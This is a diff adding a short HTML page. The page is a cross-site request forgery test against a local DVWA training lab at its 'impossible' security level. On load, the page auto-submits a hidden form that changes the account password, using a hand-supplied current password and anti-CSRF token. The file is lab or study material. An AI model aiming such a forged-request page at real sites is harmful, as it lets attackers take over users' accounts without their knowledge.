@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>DVWA CSRF Impossible-Level Manual Token and Current Password Test</title>
+</head>
+<body>
+  <p>Set IMPOSSIBLE_TOKEN and CURRENT_PASSWORD from your active DVWA session.</p>
+
+  <form id="csrfForm" action="http://localhost:8081/vulnerabilities/csrf/" method="GET">
+    <input type="hidden" name="password_current" value="CURRENT_PASSWORD">
+    <input type="hidden" name="password_new" value="ImpManual123!">
+    <input type="hidden" name="password_conf" value="ImpManual123!">
+    <input type="hidden" name="Change" value="Change">
+    <input type="hidden" name="user_token" value="IMPOSSIBLE_TOKEN">
+  </form>
+
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
